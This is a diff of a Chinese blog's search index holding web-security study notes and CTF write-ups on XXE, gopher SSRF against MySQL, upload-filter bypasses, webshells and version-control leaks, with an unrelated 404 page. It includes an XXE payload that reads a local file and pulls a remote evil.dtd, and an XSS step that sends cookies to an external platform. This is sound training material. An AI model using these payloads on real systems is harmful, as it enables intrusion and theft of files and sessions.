@@ -279,7 +279,8 @@
 <hr>
 <h3 id="二、xss"><a href="#二、xss" class="headerlink" title="二、xss"></a>二、xss</h3><hr>
 <h3 id="三、csrf"><a href="#三、csrf" class="headerlink" title="三、csrf"></a>三、csrf</h3><hr>
-<h3 id="四、xxe"><a href="#四、xxe" class="headerlink" title="四、xxe"></a>四、xxe</h3><h4 id="必须在文档类型定义-DTD-中创建实体"><a href="#必须在文档类型定义-DTD-中创建实体" class="headerlink" title="必须在文档类型定义 (DTD) 中创建实体"></a>必须在文档类型定义 (DTD) 中创建实体</h4><p><img src="/2022/05/28/Web-study/image-20221015095141092.png" alt="image-20221015095141092"></p>
+<h3 id="四、xxe"><a href="#四、xxe" class="headerlink" title="四、xxe"></a>四、xxe</h3><p><a href="https://www.jianshu.com/p/ec2888780308">推荐学习文章</a></p>
+<h4 id="必须在文档类型定义-DTD-中创建实体"><a href="#必须在文档类型定义-DTD-中创建实体" class="headerlink" title="必须在文档类型定义 (DTD) 中创建实体"></a>必须在文档类型定义 (DTD) 中创建实体</h4><p><img src="/2022/05/28/Web-study/image-20221015095141092.png" alt="image-20221015095141092"></p>
 <p>正如您所看到的，一旦 XML 文档被解析器处理，它将<code>js</code>用定义的常量<code>“Jo Smith”</code>替换定义的实体。如您所见，这有很多优点，因为您可以<code>js</code>在一个地方更改为例如<code>“John Smith”</code>。</p>
 <p>在 <code>Java</code> 应用程序中，<code>XML</code> 可用于从客户端获取数据到服务器，我们都熟悉 <code>JSON api</code>，我们也可以使用 <code>xml</code> 来获取信息。大多数情况下，框架会根据 <code>xml</code> 结构自动填充 <code>Java</code> 对象，例如：</p>
 <p><img src="/2022/05/28/Web-study/image-20221015095555062.png" alt="image-20221015095555062"></p>
@@ -311,6 +312,12 @@
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PROLOG"><figure class="iseeu highlight /prolog"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;method&quot;</span> : <span class="string">&quot;GET&quot;</span>,</span><br><span class="line">  <span class="string">&quot;path&quot;</span> : <span class="string">&quot;/landing&quot;</span>,</span><br><span class="line">  <span class="string">&quot;headers&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;request&quot;</span> : &#123;</span><br><span class="line">      <span class="string">&quot;user-agent&quot;</span> : <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;parameters&quot;</span> : &#123;</span><br><span class="line">    <span class="string">&quot;test&quot;</span> : [ <span class="string">&quot;HelloWorld&quot;</span> ],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;timeTaken&quot;</span> : <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <p>因此，通过<code>XXE</code>能够连接我们自己的服务器，这意味着<code>XXE</code>注入是可能的。 因此，通过<code>XXE</code>注入我们基本上能够达到，<code>curl</code>命令的相同的效果 </p>
+<h4 id="引用远程服务器上的DTD"><a href="#引用远程服务器上的DTD" class="headerlink" title="引用远程服务器上的DTD"></a>引用远程服务器上的DTD</h4><p>另一种方式<code>% 变量</code>(有空格)，该方式只能在DTD中进行变量引用<code>%变量</code>，而不能在XML中引用。</p>
+<p>改为引用远程服务器上的DTD(evil.dtd)</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">GVI</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">body</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///tmp/test.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://ip/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+
+
 <hr>
 <h3 id="五、ssrf"><a href="#五、ssrf" class="headerlink" title="五、ssrf"></a>五、ssrf</h3><h4 id="gopher协议总结"><a href="#gopher协议总结" class="headerlink" title="gopher协议总结"></a>gopher协议总结</h4><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667791">原文</a></p>
 <p><a href="https://blog.csdn.net/qq_60115503/article/details/124407499">另一篇推荐的文章</a></p>
@@ -344,37 +351,37 @@
 
 <h5 id="gopher打FastCGI"><a href="#gopher打FastCGI" class="headerlink" title="gopher打FastCGI"></a>gopher打FastCGI</h5><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121643002">看我这一篇</a></p>
 <h5 id="gopher打redis"><a href="#gopher打redis" class="headerlink" title="gopher打redis"></a>gopher打redis</h5><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667613">看我这一篇</a></p>
-<h5 id="gopher打mysql"><a href="#gopher打mysql" class="headerlink" title="gopher打mysql"></a>gopher打mysql</h5><p>gopher打mysql，就是利用gopher协议传shell到mysql中。</p>
+<h5 id="gopher打mysql"><a href="#gopher打mysql" class="headerlink" title="gopher打mysql"></a>gopher打mysql</h5><p><code>gopher</code>打<code>mysql</code>，就是利用<code>gopher</code>协议传<code>shell</code>到<code>mysql</code>中。</p>
 <p>首先Mysql存在三种连接方式</p>
 <pre><code>Unix套接字；
 内存共享/命名管道；
 TCP/IP套接字；
 </code></pre>
-<p>MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。</p>
+<p><code>MySQL</code>客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。</p>
 <pre><code>当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证
 当无需密码认证时直接发送TCP/IP数据包即可
 </code></pre>
-<p>这儿对localhost和127.0.0.1做一个区别</p>
+<p>这儿对<code>localhost</code>和127.0.0.1做一个区别</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line">localhost也叫local ，正确的解释是：本地服务器。</span><br><span class="line"><span class="number">127.0.0.1</span>的正确解释是：本机地址（本机服务器），它的解析通过本机的host文件，windows自动将localhost解析为<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>。</span><br><span class="line">localhot（local）是不经网卡传输的，这点很重要，它不受网络防火墙和网卡相关的的限制。<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>是通过网卡传输，依赖网卡，并受到网络防火墙和网卡相关的限制</span><br><span class="line">简单说</span><br><span class="line">当我们通过mysql -hlocalhost -uname去连接的时候，没有经过网卡，使用的是unix套接字连接，这种时候我们tcpdump是抓不到包的</span><br><span class="line">当我们需要抓取mysql通信数据包时必须使用TCP/IP套接字连接。</span><br><span class="line">mysql -h <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> -uname</span><br></pre></td></tr></table></figure></div>
 
-<p>我们平常打mysql最常用的就是打无密码的mysql</p>
-<p>但是我们在用gopher还是需要用dict协议去得到mysql的端口(默认是3306)</p>
-<p>直接使用的gopherus工具,直接快速生成payload<br><img src="/2022/05/28/Web-study/image-20220815234910350.png" alt="image-20220815234910350"></p>
+<p>我们平常打<code>mysql</code>最常用的就是打无密码的<code>mysql</code></p>
+<p>但是我们在用<code>gopher</code>还是需要用dict协议去得到<code>mysql</code>的端口(默认是<code>3306</code>)</p>
+<p>直接使用的<code>gopherus</code>工具,直接快速生成<code>payload</code><br><img src="/2022/05/28/Web-study/image-20220815234910350.png" alt="image-20220815234910350"></p>
 <hr>
 <h3 id="六、文件上传"><a href="#六、文件上传" class="headerlink" title="六、文件上传"></a>六、文件上传</h3><h4 id="1-多重过滤绕过"><a href="#1-多重过滤绕过" class="headerlink" title="1.多重过滤绕过"></a>1.多重过滤绕过</h4><p><u><strong>下面是以攻防世界的一道easyupload的wp讲解一些情形的绕过方式</strong></u></p>
 <p>这里需要绕过的点如下</p>
 <ul>
-<li>检查文件内容是否有php字符串</li>
-<li>检查后缀中是否有htaccess或ph</li>
+<li>检查文件内容是否有<code>php</code>字符串</li>
+<li>检查后缀中是否有<code>htaccess</code>或<code>php</code></li>
 <li>检查文件头部信息</li>
-<li>文件MIME类型</li>
+<li>文件<code>MIME</code>类型</li>
 </ul>
 <p>对于<u>第一点</u>可以利用<strong>短标签</strong>绕过，例如 <?=phpinfo();?></p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">把short_open_tag 字段改为On，就可以实现短标签功能</span><br><span class="line"></span><br><span class="line">短标签：</span><br><span class="line"><span class="number">1</span>.能正常解析类似于这样形式的php文件： <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.使用<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>的形式输出，在短标签看来，<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.<span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span></span><br><span class="line">就相当于</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
 
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">正确：</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">报错：</span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">从这个对比试验我们可以看出：</span><br><span class="line">在短标签模式下，</span><br><span class="line">我们执行php语句php函数，都用类似于这样形式的php文件：</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">但是我们要输出一个flag，或者变量时，使用<span class="meta">&lt;?=</span><span class="variable">$a</span><span class="meta">?&gt;</span>的形式输出</span><br></pre></td></tr></table></figure></div>
 
-<p>对于<u>第二点</u>可以通过上传**.user.ini**以及正常jpg文件来进行getshell,可以参考以下文章</p>
+<p>对于<u>第二点</u>可以通过上传**.user.ini**以及正常jpg文件来进行<code>getshell</code>,可以参考以下文章</p>
 <p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">文章</a></p>
 <p><strong>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</strong></p>
 <p> <strong>这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</strong></p>
@@ -2151,6 +2158,89 @@ handler 指向RequestHandler
       </categories>
   </entry>
   <entry>
+    <title>404</title>
+    <url>//404</url>
+    <content><![CDATA[<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>该页面不存在-404.life</title>
+<link rel="shortcut icon" href="favicon.ico">
+    <style type="text/css">
+
+
+<pre><code>*&#123;
+    margin: 0;
+    padding: 0;
+    list-style: none;
+    font-family: &#39;Noto Sans TC&#39;, sans-serif;
+
+&#125;
+
+
+
+.wrap9&#123;
+    margin: 220px 30px;
+    background-color: #000;
+&#125;
+.container9&#123;
+    width: 1300px;
+    margin: auto;
+    text-align: center;
+&#125;
+.container9 h1&#123;
+    width:50%;
+    display: inline-block;
+    margin-top: 50px;
+    box-sizing: border-box;
+    font-size: 80px;
+    background-color: #a00;
+    color: #fff;
+    margin-bottom: 0.5em;
+</code></pre>
+<p>​<br>    }</p>
+<pre><code>.container9 .txt&#123;
+    flex-shrink: 0;
+    box-sizing: border-box;
+    color: #fff;
+&#125;
+.container9 .txt P&#123;
+    display: inline-block;
+    margin-bottom: 30px;
+    font-size: 26px;
+    padding: 0 100px;
+&#125;
+.container9 .txt p:first-child:first-letter&#123;
+    font-size: 40px;
+&#125;
+
+
+
+&lt;/style&gt;
+</code></pre>
+</head>
+<body bgcolor="black">
+    
+<pre><code>&lt;div class=&quot;wrap9&quot;&gt;
+    &lt;div class=&quot;container9&quot;&gt;
+        &lt;h1&gt;404 WARNING&lt;/h1&gt;
+        &lt;div class=&quot;txt&quot;&gt;
+            &lt;p&gt;This is not what you want, but we are very serious. I just want to tell you in a special way that the page you visited does not exist or the file is invalid. You can contact the webmaster to solve your problem faster, or return to the homepage of the website to browse other pages. The homepage address link of the website is: https://404.life&lt;/p&gt;
+</code></pre>
+<p>​<br>            </div><br>        </div><br>    </div></p>
+</body>
+<!-- partial -->
+
+</body>
+</html>
+
+
+
+</style></head></html>]]></content>
+  </entry>
+  <entry>
     <title>密码+杂项题简单记录</title>
     <url>/2022/09/27/crypto+misc/</url>
     <content><![CDATA[<p><code>只会web，得分太少，还是搞点密码和杂项来提高一下</code></p>
@@ -2337,8 +2427,8 @@ handler 指向RequestHandler
 <h2 id="2-2-信息泄露-bak文件"><a href="#2-2-信息泄露-bak文件" class="headerlink" title="2.2 信息泄露-bak文件"></a>2.2 信息泄露-bak文件</h2><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">访问url/文件名.后缀名<span class="string">.bak</span></span><br></pre></td></tr></table></figure>
 
 <p>下载bak（备份文件）</p>
-<h2 id="2-3-信息泄露-vim缓存"><a href="#2-3-信息泄露-vim缓存" class="headerlink" title="2.3 信息泄露-vim缓存"></a>2.3 信息泄露-vim缓存</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
-<p>以 index.php 为例：<br><strong>第一次</strong>产生的交换文件名为 <code>.index.php.swp</code></p>
+<h2 id="2-3-信息泄露-vim缓存"><a href="#2-3-信息泄露-vim缓存" class="headerlink" title="2.3 信息泄露-vim缓存"></a>2.3 信息泄露-vim缓存</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在使用<code>vim</code>时会创建临时缓存文件，关闭<code>vim</code>时缓存文件则会被删除，当<code>vim</code>异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
+<p>以 <code>index.php</code> 为例：<br><strong>第一次</strong>产生的交换文件名为 <code>.index.php.swp</code></p>
 <p><strong>再次意外退出</strong>后，将会产生名为 <code>.index.php.swo</code> 的交换文件</p>
 <p><strong>第三次产生</strong>的交换文件则为 <code>.index.php.swn</code><br>作用</p>
 <p><u>可用来恢复意外退出的文件</u></p>
@@ -2355,50 +2445,56 @@ handler 指向RequestHandler
 <p><strong>注意githack需要python2.7版本</strong></p>
 <p><code>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</code></p>
 <p><code>GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。</code></p>
-<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>1、解析.git/index文件，找到工程中所有的： ( 文件名，文件sha1 )<br>2、去.git/objects/ 文件夹下下载对应的文件<br>3、zlib解压文件，按原始的目录结构写入源代码</p>
-<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>速度快，默认20个工作线程<br>尽量还原所有的源代码，缺失的文件不影响脚本工作<br>脚本不需要执行额外的git命令，all you need is python<br>脚本无需浏览目录</p>
+<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>1、解析<code>.git/index</code>文件，找到工程中所有的： ( 文件名，文件sha1 )<br>2、去<code>.git/objects/</code> 文件夹下下载对应的文件<br>3、<code>zlib</code>解压文件，按原始的目录结构写入源代码</p>
+<h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>速度快，默认20个工作线程<br>尽量还原所有的源代码，缺失的文件不影响脚本工作<br>脚本不需要执行额外的git命令，<code>all you need is python</code><br>脚本无需浏览目录</p>
 <h3 id="用法示例"><a href="#用法示例" class="headerlink" title="用法示例"></a>用法示例</h3><p>注意这里在url后面需要加上.git，用dirsearch可以扫出来（python3）</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">GitHack.py http:<span class="regexp">//</span>www.openssl.org<span class="regexp">/.git/</span></span><br></pre></td></tr></table></figure></div>
 
-<p>然后在目录dist就会生成对应目录 </p>
-<p>打开目录，输入cmd，执行<code>git log</code>【git log 可以查看commit history，也就是命令执行的历史，可以看看之前执行过哪些命令，方便后面查询命令执行的具体内容】</p>
+<p>然后在目录<code>dist</code>就会生成对应目录 </p>
+<p>打开目录，输入<code>cmd</code>，执行<code>git log</code>【<code>git log</code> 可以查看<code>commit history</code>，也就是命令执行的历史，可以看看之前执行过哪些命令，方便后面查询命令执行的具体内容】</p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220728230330073.png" alt="image-20220728230330073"></p>
-<p>然后复制add flag这个命令的代码，如上图<code>75272ca078b7eedcf329a2b08f6e4faae0a36a99</code></p>
-<p>然后用git diff</p>
+<p>然后复制<code>add flag</code>这个命令的代码，如上图<code>75272ca078b7eedcf329a2b08f6e4faae0a36a99</code></p>
+<p>然后用<code>git diff</code></p>
 <p>【</p>
 <p>git diff比较两个版本的差异，</p>
 <p>这里后面只有<strong>一个命令</strong>就是比较本地工作区和缓存区的信息区别</p>
 <p>如果后面有<strong>两个命令</strong>，就是比较这两个命令的差别</p>
 <p>】</p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220728231134513.png" alt="image-20220728231134513"></p>
-<p>这里比较，就得到了flag</p>
+<p>这里比较，就得到了<code>flag</code></p>
 <h2 id="4-信息泄露-Git泄露-Stash"><a href="#4-信息泄露-Git泄露-Stash" class="headerlink" title="4.信息泄露-Git泄露-Stash"></a>4.信息泄露-Git泄露-Stash</h2><h3 id="git-stash-的作用"><a href="#git-stash-的作用" class="headerlink" title="git stash 的作用"></a>git stash 的作用</h3><p>git stash用于想要保存当前的修改,但是想回到之前最后一次提交的干净的工作仓库时进行的操作.git stash将本地的修改保存起来,并且将当前代码切换到HEAD提交上.</p>
-<p>通过git stash存储的修改列表,可以通过<u><strong>git stash list</strong></u>查看.<u><strong>git stash show</strong></u>用于校验,<u><strong>git stash apply</strong></u>用于重新存储.直接执行<u>git stash等同于git stash save.</u></p>
-<p>最新的存储保存在<u><strong>refs/stash</strong></u>中.老的存储可以通过相关的参数获得,例如stash@{0}获取最新的存储,stash@{1}获取次新.stash@{2.hour.ago}获取两小时之前的.存储可以直接通过索引的位置来获得stash@{n}.</p>
+<p>通过git stash存储的修改列表,可以通过<u><strong>git stash list</strong></u>查看.<u><strong>git stash show</strong></u>用于校验,<u><strong>git stash apply</strong></u>用于重新存储.直接执行<u><code>git stash</code>等同于<code>git stash save.</code></u></p>
+<p>最新的存储保存在<code>refs/stash</code>中老的存储可以通过相关的参数获得,例如<code>stash@&#123;0&#125;</code>获取最新的存储,stash@{1}获取次新<code>.stash@&#123;2.hour.ago&#125;</code>获取两小时之前的.存储可以直接通过索引的位置来获得<code>stash@&#123;n&#125;</code>.</p>
 <p>操作同<code>2.log</code></p>
-<p>可以先用dirsearch扫一下， 发现<u><strong>refs/stash</strong></u>文件，</p>
-<p>然后用GitHack扫描</p>
-<p>在生成文件夹里有stash文件</p>
-<p><code>D:\GitHack-master\dist\challenge-8d48663e236c2ebc.sandbox.ctfhub.com_10800\.git\refs</code></p>
+<p>可以先用<code>dirsearch</code>扫一下， 发现<code>refs/stash</code>文件，</p>
+<p>然后用<code>GitHack</code>扫描</p>
+<p>在生成文件夹里有<code>stash</code>文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="R"><figure class="iseeu highlight /r"><table><tr><td class="code"><pre><span class="line">`D:\GitHack-master\dist\challenge-8d48663e236c2ebc.sandbox.ctfhub.com_10800\.git\refs`</span><br></pre></td></tr></table></figure></div>
+
 <p><img src="/2022/07/27/CTFHub-wp/image-20220729115457869.png" alt="image-20220729115457869"></p>
 <p>打开看到</p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220729115528299.png" alt="image-20220729115528299"></p>
 <p>在生成的文件夹下用</p>
-<p><code>git diff d8c1978b1e71300574e1bb5335a01124b3a55569</code></p>
-<p>得到flag</p>
-<p>【也可以使用 git bash，直接在生成的文件夹下</p>
-<p>执行git stash list </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="code"><pre><span class="line">git diff d8c1978b1e71300574e1bb5335a01<span class="number">124b3a55569</span></span><br></pre></td></tr></table></figure></div>
+
+<p>得到<code>flag</code></p>
+<p>【也可以使用 <code>git bash</code>，直接在生成的文件夹下</p>
+<p>执行<code>git stash list</code> </p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">查看stash了哪些存储</span><br></pre></td></tr></table></figure>
 
-<p>然后执行git stash pop</p>
-<pre><code>恢复之前缓存的工作目录，将缓存堆栈中的对应stash删除，并将对应修改应用到当前的工作目录下,默认为第一个stash,即stash@&#123;0&#125;，如果要应用并删除其他stash，命令：git stash pop stash@&#123;$num&#125; ，比如应用并删除第二个：git stash pop stash@&#123;1&#125;）
+<p>然后执行<code>git stash pop</code></p>
+<pre><code>恢复之前缓存的工作目录，将缓存堆栈中的对应stash删除，
+并将对应修改应用到当前的工作目录下,默认为第一个stash,即stash@&#123;0&#125;，
+
+如果要应用并删除其他stash，命令：git stash pop stash@&#123;$num&#125; ，
+比如应用并删除第二个：git stash pop stash@&#123;1&#125;）
 </code></pre>
-<p>然后会在该目录下生成一个新的txt文件，打开或用cat命令，得到flag</p>
+<p>然后会在该目录下生成一个新的<code>txt</code>文件，打开或用<code>cat</code>命令，得到<code>flag</code></p>
 <p>】</p>
 <h2 id="5-信息泄露-SVN泄露"><a href="#5-信息泄露-SVN泄露" class="headerlink" title="5.信息泄露-SVN泄露"></a>5.信息泄露-SVN泄露</h2><p><code>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</code></p>
-<p>这道题需要运用<strong>dvcs-ripper</strong>工具进行处理</p>
-<p>可以先用dirsearch扫出.svn目录，说明有SVN泄露</p>
-<p>和githack类似，</p>
+<p>这道题需要运用<code>dvcs-ripper</code>工具进行处理</p>
+<p>可以先用<code>dirsearch</code>扫出<code>.svn</code>目录，说明有<code>SVN</code>泄露</p>
+<p>和<code>githack</code>类似，</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/rip-svn.pl -v -u url/</span>.svn</span><br></pre></td></tr></table></figure></div>
 
 <p>然后在dvcs-ripper目录里，进入.svn目录</p>
@@ -2406,25 +2502,26 @@ handler 指向RequestHandler
 <p>然后进入pristine目录，进去发现两个目录，挨个打开</p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220729175252045.png" alt="image-20220729175252045"></p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220729175429878.png" alt="image-20220729175429878"></p>
-<p>发现一个目录下是网站页面源码，另一个就是flag</p>
-<p>得到flag</p>
-<h2 id="6-信息泄露-HG泄露"><a href="#6-信息泄露-HG泄露" class="headerlink" title="6.信息泄露-HG泄露"></a>6.信息泄露-HG泄露</h2><p><code>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</code></p>
-<p>可以先用dirsearch扫出.hg目录，说明有HG泄露</p>
-<p>这个和SVN一样，只不过要改成.hg</p>
+<p>发现一个目录下是网站页面源码，另一个就是<code>flag</code></p>
+<p>得到<code>flag</code></p>
+<h2 id="6-信息泄露-HG泄露"><a href="#6-信息泄露-HG泄露" class="headerlink" title="6.信息泄露-HG泄露"></a>6.信息泄露-HG泄露</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line"><span class="string">`当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。`</span></span><br></pre></td></tr></table></figure></div>
+
+<p>可以先用<code>dirsearch</code>扫出<code>.hg</code>目录，说明有<code>HG</code>泄露</p>
+<p>这个和<code>SVN</code>一样，只不过要改成<code>.hg</code></p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">.<span class="regexp">/rip-hg.pl -v -u url/</span>.hg</span><br></pre></td></tr></table></figure></div>
 
 <p><img src="/2022/07/27/CTFHub-wp/image-20220730164340016.png" alt="image-20220730164340016"></p>
-<p>发现两个文件，猜测为HG泄露文件</p>
+<p>发现两个文件，猜测为<code>HG</code>泄露文件</p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220730164428184.png" alt="image-20220730164428184"></p>
-<p>发现flag文本文件</p>
+<p>发现<code>flag</code>文本文件</p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220730164949862.png" alt="image-20220730164949862"></p>
-<p>url+flag_973127138.txt</p>
-<p>得到flag</p>
+<p><code>url+flag_973127138.txt</code></p>
+<p>得到<code>flag</code></p>
 <h2 id="7-xss-xss反射型"><a href="#7-xss-xss反射型" class="headerlink" title="7.xss-xss反射型"></a>7.xss-xss反射型</h2><p>发现它有两个输入框</p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220731104635854.png" alt="image-20220731104635854"></p>
 <p>第一个输入测试语句，成功弹窗</p>
-<p>第二个是发送url，盲猜是发到后台</p>
-<p>看了一些wp，发现需要使用xss测试平台<code>http://xsscom.com//index.php</code></p>
+<p>第二个是发送<code>url</code>，盲猜是发到后台</p>
+<p>看了一些<code>wp</code>，发现需要使用<code>xss</code>测试平台<code>http://xsscom.com//index.php</code></p>
 <p>先创建项目</p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220731113619175.png" alt="image-20220731113619175"></p>
 <p>设置配置</p>
@@ -2441,27 +2538,26 @@ handler 指向RequestHandler
 <p><img src="/2022/07/27/CTFHub-wp/image-20220731114028909.png" alt="image-20220731114028909"></p>
 <p>然后返回xss测试平台上查看</p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220731114142138.png" alt="image-20220731114142138"></p>
-<p>cookie处出现flag</p>
+<p><code>cookie</code>处出现<code>flag</code></p>
 <h2 id="8-文件上传-文件头检查"><a href="#8-文件上传-文件头检查" class="headerlink" title="8.文件上传-文件头检查"></a>8.文件上传-文件头检查</h2><p><code>文件头是直接位于文件中的一段数据,是文件的一部分</code></p>
 <p>这里过滤文件头，而且限制图片类型文件，所以可以试试上传一个没有任何问题的图片【注意图片不能太大，不然会最后用蚁剑连接会爆错，我上传1mb大小图片就报错，最后上传400字节图片才成功】</p>
 <p><img src="/2022/07/27/CTFHub-wp/image-20220731164210465.png" alt="image-20220731164210465"></p>
 <p>上传图片后，在后面加上一句话木马，并修改文件名</p>
-<p><strong>【也可以用cmd 合成图片马，也是有图片文件头】</strong></p>
-<p><strong>【copy 图片名.png(.jpg)/b + 木马文件名.php(.asp/.aspx)/a 生成图片名.png(.jpg)】</strong></p>
